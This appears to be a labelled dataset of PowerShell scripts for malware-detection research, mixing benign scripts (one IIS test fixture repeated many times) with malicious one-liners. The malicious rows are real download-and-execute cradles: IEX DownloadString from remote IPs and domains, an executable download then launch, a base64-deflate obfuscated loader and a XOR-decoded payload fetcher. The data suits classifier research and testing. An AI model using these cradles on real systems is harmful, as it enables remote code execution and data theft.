+2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {
+
+
+
+
+
+if (!(Get-command -Module PowerShellGet).count -gt 0)
+    {
+
+        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
+        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'
+
+    switch ($env:PROCESSOR_ARCHITECTURE)
+    {
+        'x86' {$version = $x86}
+        'AMD64' {$version = $x64}
+    }
+
+    $Request = [System.Net.WebRequest]::Create($version)
+    $Request.Timeout = ""100000000""
+    $URL = $Request.GetResponse()
+    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
+    $url.close()
+    $WC = New-Object -TypeName System.Net.WebClient
+    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
+    $WC.Dispose()
+
+    msiexec.exe /package ""$env:TEMP\$Filename""
+
+    Start-Sleep 80
+    Remove-Item ""$env:TEMP\$Filename""
+    }
+}
+
+Install-PowerShellPackageManagement
+
+
+       ",22,benign,DownloadFile,True,benign,-1.453125
+1269.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,139,139,False,"(New-Object System.Net.WebClient).DownloadFile('http://brokelimiteds.in/wp-admin/css/upload/Order.exe','mess.exe');Start-Process 'mess.exe'",22,malicious,DownloadFile,True,malicious,6.609375
+1113.ps1,benign,natural_overlap,DownloadString,DownloadString|Net.WebClient,2,True,2146,2146,False,"$siteName = 'DefaultDocument'
+$sitePort = 4387
+$webConfigPath = Join-Path $TestDir web.config
+
+function Start-TestFixture
+{
+    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)
+
+    Install-IisAppPool -Name $siteName
+}
+
+function Stop-TestFixture
+{
+    Uninstall-IisAppPool -Name $siteName
+}
+
+function Start-Test
+{
+    Uninstall-IisWebsite $siteName
+    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
+    if( Test-Path $webConfigPath -PathType Leaf )
+    {
+        Remove-Item $webConfigPath
+    }
+}
+
+function Stop-Test
+{
+    Uninstall-IisWebsite $siteName
+}
+
+function Test-ShouldAddDefaultDocument
+{
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Assert-DefaultDocumentReturned
+    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
+}
+
+function Test-ShouldAddDefaultDocumentTwice
+{
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Assert-NoError
+    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
+    Assert-NotNull $section
+    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
+    Assert-DefaultDocumentReturned
+}
+
+function Assert-DefaultDocumentReturned()
+{
+    $html = ''
+    $maxTries = 10
+    $tryNum = 0
+    $defaultDocumentReturned = $false
+    do
+    {
+        try
+        {    
+            $browser = New-Object Net.WebClient
+            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
+            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
+            $defaultDocumentReturned = $true
+        }
+        catch
+        {
+            Start-Sleep -Milliseconds 100
+        }
+        $tryNum += 1
+    }
+    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
+    
+    Assert-True $defaultDocumentReturned ""Default document never returned.""
+}",23,benign,DownloadString,True,benign,-3.390625
+3084.ps1,malicious,natural_overlap,DownloadString,IEX|DownloadString|Net.WebClient,3,True,150,150,False,Set-ExecutionPolicy Bypass -Scope Process;IEX ((New-Object Net.WebClient).DownloadString('http://127.0.0.1/detxt.ps1') );detxt http://127.0.0.1/1.txt;,23,malicious,DownloadString,True,malicious,1.28125
+1113.ps1,benign,natural_overlap,DownloadString,DownloadString|Net.WebClient,2,True,2146,2146,False,"$siteName = 'DefaultDocument'
+$sitePort = 4387
+$webConfigPath = Join-Path $TestDir web.config
+
+function Start-TestFixture
+{
+    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)
+
+    Install-IisAppPool -Name $siteName
+}
+
+function Stop-TestFixture
+{
+    Uninstall-IisAppPool -Name $siteName
+}
+
+function Start-Test
+{
+    Uninstall-IisWebsite $siteName
+    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
+    if( Test-Path $webConfigPath -PathType Leaf )
+    {
+        Remove-Item $webConfigPath
+    }
+}
+
+function Stop-Test
+{
+    Uninstall-IisWebsite $siteName
+}
+
+function Test-ShouldAddDefaultDocument
+{
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Assert-DefaultDocumentReturned
+    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
+}
+
+function Test-ShouldAddDefaultDocumentTwice
+{
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Assert-NoError
+    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
+    Assert-NotNull $section
+    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
+    Assert-DefaultDocumentReturned
+}
+
+function Assert-DefaultDocumentReturned()
+{
+    $html = ''
+    $maxTries = 10
+    $tryNum = 0
+    $defaultDocumentReturned = $false
+    do
+    {
+        try
+        {    
+            $browser = New-Object Net.WebClient
+            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
+            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
+            $defaultDocumentReturned = $true
+        }
+        catch
+        {
+            Start-Sleep -Milliseconds 100
+        }
+        $tryNum += 1
+    }
+    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
+    
+    Assert-True $defaultDocumentReturned ""Default document never returned.""
+}",24,benign,DownloadString,True,benign,-3.390625
+3278.ps1,malicious,natural_overlap,DownloadString,IEX|DownloadString|Net.WebClient,3,True,127,127,False,IEX ((new-object net.webclient).downloadstring('https://wowyy.ga/counter.php?c=pdfxpl '+($env:username)+'@'+($env:userdomain))),24,malicious,DownloadString,True,malicious,3.96875
+1113.ps1,benign,natural_overlap,DownloadString,DownloadString|Net.WebClient,2,True,2146,2146,False,"$siteName = 'DefaultDocument'
+$sitePort = 4387
+$webConfigPath = Join-Path $TestDir web.config
+
+function Start-TestFixture
+{
+    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)
+
+    Install-IisAppPool -Name $siteName
+}
+
+function Stop-TestFixture
+{
+    Uninstall-IisAppPool -Name $siteName
+}
+
+function Start-Test
+{
+    Uninstall-IisWebsite $siteName
+    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
+    if( Test-Path $webConfigPath -PathType Leaf )
+    {
+        Remove-Item $webConfigPath
+    }
+}
+
+function Stop-Test
+{
+    Uninstall-IisWebsite $siteName
+}
+
+function Test-ShouldAddDefaultDocument
+{
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Assert-DefaultDocumentReturned
+    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
+}
+
+function Test-ShouldAddDefaultDocumentTwice
+{
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Assert-NoError
+    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
+    Assert-NotNull $section
+    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
+    Assert-DefaultDocumentReturned
+}
+
+function Assert-DefaultDocumentReturned()
+{
+    $html = ''
+    $maxTries = 10
+    $tryNum = 0
+    $defaultDocumentReturned = $false
+    do
+    {
+        try
+        {    
+            $browser = New-Object Net.WebClient
+            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
+            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
+            $defaultDocumentReturned = $true
+        }
+        catch
+        {
+            Start-Sleep -Milliseconds 100
+        }
+        $tryNum += 1
+    }
+    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
+    
+    Assert-True $defaultDocumentReturned ""Default document never returned.""
+}",25,benign,DownloadString,True,benign,-3.390625
+2190.ps1,malicious,natural_overlap,DownloadString,IEX|DownloadString|Net.WebClient,3,True,94,94,False,"iex (New-Object Net.WebClient).DownloadString(""http://84.200.84.187/Google Update Check.html"")",25,malicious,DownloadString,True,malicious,2.28125
+1113.ps1,benign,natural_overlap,DownloadString,DownloadString|Net.WebClient,2,True,2146,2146,False,"$siteName = 'DefaultDocument'
+$sitePort = 4387
+$webConfigPath = Join-Path $TestDir web.config
+
+function Start-TestFixture
+{
+    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)
+
+    Install-IisAppPool -Name $siteName
+}
+
+function Stop-TestFixture
+{
+    Uninstall-IisAppPool -Name $siteName
+}
+
+function Start-Test
+{
+    Uninstall-IisWebsite $siteName
+    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
+    if( Test-Path $webConfigPath -PathType Leaf )
+    {
+        Remove-Item $webConfigPath
+    }
+}
+
+function Stop-Test
+{
+    Uninstall-IisWebsite $siteName
+}
+
+function Test-ShouldAddDefaultDocument
+{
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Assert-DefaultDocumentReturned
+    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
+}
+
+function Test-ShouldAddDefaultDocumentTwice
+{
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Assert-NoError
+    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
+    Assert-NotNull $section
+    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
+    Assert-DefaultDocumentReturned
+}
+
+function Assert-DefaultDocumentReturned()
+{
+    $html = ''
+    $maxTries = 10
+    $tryNum = 0
+    $defaultDocumentReturned = $false
+    do
+    {
+        try
+        {    
+            $browser = New-Object Net.WebClient
+            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
+            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
+            $defaultDocumentReturned = $true
+        }
+        catch
+        {
+            Start-Sleep -Milliseconds 100
+        }
+        $tryNum += 1
+    }
+    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
+    
+    Assert-True $defaultDocumentReturned ""Default document never returned.""
+}",26,benign,DownloadString,True,benign,-3.390625
+3804.ps1,malicious,natural_overlap,DownloadString,IEX|DownloadString|Net.WebClient,3,True,94,94,False,"iex (New-Object Net.WebClient).DownloadString(""http://84.200.84.187/Google Update Check.html"")",26,malicious,DownloadString,True,malicious,2.28125
+1113.ps1,benign,natural_overlap,DownloadString,DownloadString|Net.WebClient,2,True,2146,2146,False,"$siteName = 'DefaultDocument'
+$sitePort = 4387
+$webConfigPath = Join-Path $TestDir web.config
+
+function Start-TestFixture
+{
+    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)
+
+    Install-IisAppPool -Name $siteName
+}
+
+function Stop-TestFixture
+{
+    Uninstall-IisAppPool -Name $siteName
+}
+
+function Start-Test
+{
+    Uninstall-IisWebsite $siteName
+    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
+    if( Test-Path $webConfigPath -PathType Leaf )
+    {
+        Remove-Item $webConfigPath
+    }
+}
+
+function Stop-Test
+{
+    Uninstall-IisWebsite $siteName
+}
+
+function Test-ShouldAddDefaultDocument
+{
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Assert-DefaultDocumentReturned
+    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
+}
+
+function Test-ShouldAddDefaultDocumentTwice
+{
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Assert-NoError
+    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
+    Assert-NotNull $section
+    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
+    Assert-DefaultDocumentReturned
+}
+
+function Assert-DefaultDocumentReturned()
+{
+    $html = ''
+    $maxTries = 10
+    $tryNum = 0
+    $defaultDocumentReturned = $false
+    do
+    {
+        try
+        {    
+            $browser = New-Object Net.WebClient
+            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
+            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
+            $defaultDocumentReturned = $true
+        }
+        catch
+        {
+            Start-Sleep -Milliseconds 100
+        }
+        $tryNum += 1
+    }
+    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
+    
+    Assert-True $defaultDocumentReturned ""Default document never returned.""
+}",27,benign,DownloadString,True,benign,-3.390625
+2894.ps1,malicious,natural_overlap,DownloadString,IEX|DownloadString|Net.WebClient,3,True,87,87,False,iex ((New-Object Net.WebClient).DownloadString('http://76.74.127.38/default-nco.html')),27,malicious,DownloadString,True,malicious,1.9375
+1113.ps1,benign,natural_overlap,DownloadString,DownloadString|Net.WebClient,2,True,2146,2146,False,"$siteName = 'DefaultDocument'
+$sitePort = 4387
+$webConfigPath = Join-Path $TestDir web.config
+
+function Start-TestFixture
+{
+    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)
+
+    Install-IisAppPool -Name $siteName
+}
+
+function Stop-TestFixture
+{
+    Uninstall-IisAppPool -Name $siteName
+}
+
+function Start-Test
+{
+    Uninstall-IisWebsite $siteName
+    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
+    if( Test-Path $webConfigPath -PathType Leaf )
+    {
+        Remove-Item $webConfigPath
+    }
+}
+
+function Stop-Test
+{
+    Uninstall-IisWebsite $siteName
+}
+
+function Test-ShouldAddDefaultDocument
+{
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Assert-DefaultDocumentReturned
+    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
+}
+
+function Test-ShouldAddDefaultDocumentTwice
+{
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Assert-NoError
+    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
+    Assert-NotNull $section
+    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
+    Assert-DefaultDocumentReturned
+}
+
+function Assert-DefaultDocumentReturned()
+{
+    $html = ''
+    $maxTries = 10
+    $tryNum = 0
+    $defaultDocumentReturned = $false
+    do
+    {
+        try
+        {    
+            $browser = New-Object Net.WebClient
+            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
+            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
+            $defaultDocumentReturned = $true
+        }
+        catch
+        {
+            Start-Sleep -Milliseconds 100
+        }
+        $tryNum += 1
+    }
+    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
+    
+    Assert-True $defaultDocumentReturned ""Default document never returned.""
+}",28,benign,DownloadString,True,benign,-3.390625
+3100.ps1,malicious,natural_overlap,DownloadString,IEX|DownloadString|Net.WebClient,3,True,81,81,False,IEX ((new-object net.webclient).downloadstring('http://pmlabs.net/cis/test.jpg')),28,malicious,DownloadString,True,malicious,0.609375
+1113.ps1,benign,natural_overlap,DownloadString,DownloadString|Net.WebClient,2,True,2146,2146,False,"$siteName = 'DefaultDocument'
+$sitePort = 4387
+$webConfigPath = Join-Path $TestDir web.config
+
+function Start-TestFixture
+{
+    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)
+
+    Install-IisAppPool -Name $siteName
+}
+
+function Stop-TestFixture
+{
+    Uninstall-IisAppPool -Name $siteName
+}
+
+function Start-Test
+{
+    Uninstall-IisWebsite $siteName
+    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
+    if( Test-Path $webConfigPath -PathType Leaf )
+    {
+        Remove-Item $webConfigPath
+    }
+}
+
+function Stop-Test
+{
+    Uninstall-IisWebsite $siteName
+}
+
+function Test-ShouldAddDefaultDocument
+{
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Assert-DefaultDocumentReturned
+    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
+}
+
+function Test-ShouldAddDefaultDocumentTwice
+{
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Assert-NoError
+    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
+    Assert-NotNull $section
+    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
+    Assert-DefaultDocumentReturned
+}
+
+function Assert-DefaultDocumentReturned()
+{
+    $html = ''
+    $maxTries = 10
+    $tryNum = 0
+    $defaultDocumentReturned = $false
+    do
+    {
+        try
+        {    
+            $browser = New-Object Net.WebClient
+            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
+            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
+            $defaultDocumentReturned = $true
+        }
+        catch
+        {
+            Start-Sleep -Milliseconds 100
+        }
+        $tryNum += 1
+    }
+    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
+    
+    Assert-True $defaultDocumentReturned ""Default document never returned.""
+}",29,benign,DownloadString,True,benign,-3.390625
+3438.ps1,malicious,natural_overlap,DownloadString,IEX|DownloadString|Net.WebClient,3,True,81,81,False,"iex (New-Object Net.WebClient).DownloadString(""http://52.183.79.94:80/TYBMkTfsQ"")",29,malicious,DownloadString,True,malicious,4.421875
+1113.ps1,benign,natural_overlap,DownloadString,DownloadString|Net.WebClient,2,True,2146,2146,False,"$siteName = 'DefaultDocument'
+$sitePort = 4387
+$webConfigPath = Join-Path $TestDir web.config
+
+function Start-TestFixture
+{
+    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)
+
+    Install-IisAppPool -Name $siteName
+}
+
+function Stop-TestFixture
+{
+    Uninstall-IisAppPool -Name $siteName
+}
+
+function Start-Test
+{
+    Uninstall-IisWebsite $siteName
+    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
+    if( Test-Path $webConfigPath -PathType Leaf )
+    {
+        Remove-Item $webConfigPath
+    }
+}
+
+function Stop-Test
+{
+    Uninstall-IisWebsite $siteName
+}
+
+function Test-ShouldAddDefaultDocument
+{
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Assert-DefaultDocumentReturned
+    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
+}
+
+function Test-ShouldAddDefaultDocumentTwice
+{
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Assert-NoError
+    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
+    Assert-NotNull $section
+    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
+    Assert-DefaultDocumentReturned
+}
+
+function Assert-DefaultDocumentReturned()
+{
+    $html = ''
+    $maxTries = 10
+    $tryNum = 0
+    $defaultDocumentReturned = $false
+    do
+    {
+        try
+        {    
+            $browser = New-Object Net.WebClient
+            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
+            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
+            $defaultDocumentReturned = $true
+        }
+        catch
+        {
+            Start-Sleep -Milliseconds 100
+        }
+        $tryNum += 1
+    }
+    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
+    
+    Assert-True $defaultDocumentReturned ""Default document never returned.""
+}",30,benign,DownloadString,True,benign,-3.390625
+3062.ps1,malicious,natural_overlap,DownloadString,IEX|DownloadString|Net.WebClient,3,True,78,78,False,IEX ((New-Object Net.WebClient).DownloadString('http://93.171.205.35:8080/'));,30,malicious,DownloadString,True,malicious,4.921875
+1113.ps1,benign,natural_overlap,DownloadString,DownloadString|Net.WebClient,2,True,2146,2146,False,"$siteName = 'DefaultDocument'
+$sitePort = 4387
+$webConfigPath = Join-Path $TestDir web.config
+
+function Start-TestFixture
+{
+    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)
+
+    Install-IisAppPool -Name $siteName
+}
+
+function Stop-TestFixture
+{
+    Uninstall-IisAppPool -Name $siteName
+}
+
+function Start-Test
+{
+    Uninstall-IisWebsite $siteName
+    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
+    if( Test-Path $webConfigPath -PathType Leaf )
+    {
+        Remove-Item $webConfigPath
+    }
+}
+
+function Stop-Test
+{
+    Uninstall-IisWebsite $siteName
+}
+
+function Test-ShouldAddDefaultDocument
+{
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Assert-DefaultDocumentReturned
+    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
+}
+
+function Test-ShouldAddDefaultDocumentTwice
+{
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Assert-NoError
+    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
+    Assert-NotNull $section
+    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
+    Assert-DefaultDocumentReturned
+}
+
+function Assert-DefaultDocumentReturned()
+{
+    $html = ''
+    $maxTries = 10
+    $tryNum = 0
+    $defaultDocumentReturned = $false
+    do
+    {
+        try
+        {    
+            $browser = New-Object Net.WebClient
+            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
+            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
+            $defaultDocumentReturned = $true
+        }
+        catch
+        {
+            Start-Sleep -Milliseconds 100
+        }
+        $tryNum += 1
+    }
+    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
+    
+    Assert-True $defaultDocumentReturned ""Default document never returned.""
+}",31,benign,DownloadString,True,benign,-3.390625
+338.ps1,malicious,natural_overlap,DownloadString,IEX|DownloadString|Net.WebClient,3,True,78,78,False,IEX (New-Object Net.WebClient).DownloadString('http://91.120.23.152/wizz.txt'),31,malicious,DownloadString,True,malicious,4.578125
+1113.ps1,benign,natural_overlap,DownloadString,DownloadString|Net.WebClient,2,True,2146,2146,False,"$siteName = 'DefaultDocument'
+$sitePort = 4387
+$webConfigPath = Join-Path $TestDir web.config
+
+function Start-TestFixture
+{
+    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)
+
+    Install-IisAppPool -Name $siteName
+}
+
+function Stop-TestFixture
+{
+    Uninstall-IisAppPool -Name $siteName
+}
+
+function Start-Test
+{
+    Uninstall-IisWebsite $siteName
+    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
+    if( Test-Path $webConfigPath -PathType Leaf )
+    {
+        Remove-Item $webConfigPath
+    }
+}
+
+function Stop-Test
+{
+    Uninstall-IisWebsite $siteName
+}
+
+function Test-ShouldAddDefaultDocument
+{
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Assert-DefaultDocumentReturned
+    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
+}
+
+function Test-ShouldAddDefaultDocumentTwice
+{
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
+    Assert-NoError
+    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
+    Assert-NotNull $section
+    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
+    Assert-DefaultDocumentReturned
+}
+
+function Assert-DefaultDocumentReturned()
+{
+    $html = ''
+    $maxTries = 10
+    $tryNum = 0
+    $defaultDocumentReturned = $false
+    do
+    {
+        try
+        {    
+            $browser = New-Object Net.WebClient
+            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
+            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
+            $defaultDocumentReturned = $true
+        }
+        catch
+        {
+            Start-Sleep -Milliseconds 100
+        }
+        $tryNum += 1
+    }
+    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
+    
+    Assert-True $defaultDocumentReturned ""Default document never returned.""
+}",32,benign,DownloadString,True,benign,-3.390625
+450.ps1,malicious,natural_overlap,DownloadString,IEX|DownloadString|Net.WebClient,3,True,75,75,False,iex (new-object net.webclient).downloadstring('https://invesco.online/aaa'),32,malicious,DownloadString,True,malicious,1.34375
+1670.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,498,498,False,"function ConvertTo-Bytes {
+    param (
+        [string]$file
+    )
+
+    if (!$file -or !(Test-Path $file)) {
+        throw ""file not found: '$file'""
+    }
+
+    [convert]::ToBase64String((Get-Content $file -Encoding Byte))
+}
+
+function ConvertFrom-Bytes {
+    param (
+        [string]$bytes,
+        [string]$savepath
+    )
+
+    $dir = Split-Path $savepath
+    if (!(Test-Path $dir)) {
+        md $dir | Out-Null
+    }
+
+    [convert]::FromBase64String($bytes) | Set-Content $savepath -Encoding Byte
+}",33,benign,FromBase64String,True,benign,-4.765625
+3780.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String,2,True,499,499,False,"sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('TY9NawIxFEX3gv8hDC5ayiRCWxcDImWK4EZLS+lCu5hJ3micTDImL/Px7/t0U5ePe+7hvoct9OmuPINE9jUGhIZvAfkPlLnRYPGRf3g3jDz3oOjUhQlsyfZ36H+SF/IEv1n2DlURDVLYO1/fNaeT6WQWvSFDckJsQyaEMlx515ZuiAG8dBYJ5tI1Iog+wGsXnkdVN+fLcRCV8+to36yiTZVGXi5eVsos5wlpK22AvDOwXUbTWvbEkkNTGC21i+GKErWxnashpe8+4RIhIEu/vWa3Teku4voquan+AA=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()",33,malicious,FromBase64String,True,malicious,1.0625
+1238.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,288,288,False,"[CmdletBinding()]
+param(
+    [Parameter(Mandatory=$true)]
+    [string]
+    $Name
+)
+
+Set-StrictMode -Version 'Latest'
+
+$Name = [Text.Encoding]::Unicode.GetString( [Convert]::FromBase64String($Name) ) 
+[Environment]::SetEnvironmentVariable( $Name, $null, [EnvironmentVariableTarget]::User )",34,benign,FromBase64String,True,benign,-1.125
+3537.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String|DownloadString|Net.WebClient,6,True,282,282,False,$i = 0; $k = '1234'; IEX((New-Object Net.WebClient).DownloadString('https://cra.aimco-alberta.ca/is.txt'));Test-Querty -Querty ([Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://cra.aimco-alberta.ca/pl.txt')) | %{ $_ -bXor $k[$i++ % $k.length] }) -Force,34,malicious,FromBase64String,True,malicious,0.5
+2781.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,1062,1062,False,"[CmdletBinding()] 
+    
+Param ([Parameter(Mandatory)] [string[]] $memstream = $(Throw(""-memstream is required"")),
+       [Parameter(Mandatory)] [string[]] $outputloc = $(Throw(""-outputloc is required""))
+)
+
+function Get-DecompressedByteArray {
+
+	[CmdletBinding()] Param ([Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
+        [byte[]] $byteArray)
+
+	Process {
+	    Write-Verbose ""Get-DecompressedByteArray""
+        $input = New-Object System.IO.MemoryStream( , $byteArray )
